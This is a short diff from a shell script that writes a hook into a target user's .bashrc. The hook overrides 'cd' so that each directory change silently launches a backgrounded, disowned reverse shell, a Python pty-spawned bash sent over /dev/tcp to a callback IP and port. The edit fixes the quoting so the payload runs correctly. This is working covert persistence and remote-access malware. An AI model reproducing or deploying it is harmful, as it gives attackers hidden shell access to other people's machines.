@@ -21,7 +21,7 @@ cat <<EOF >> "$TARGET_BASHRC"
 
 # cd hook
 cd() {
-  bash -c "python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")' >& /dev/tcp/$CALLBACK_IP/$HOOK_PORT 0>&1" 2>/dev/null & disown
+  bash -c "python -c 'import pty; pty.spawn(\"/bin/bash\")' >& /dev/tcp/$CALLBACK_IP/$HOOK_PORT 0>&1" 2>/dev/null & disown
   builtin cd "\$@"
 }
 EOF
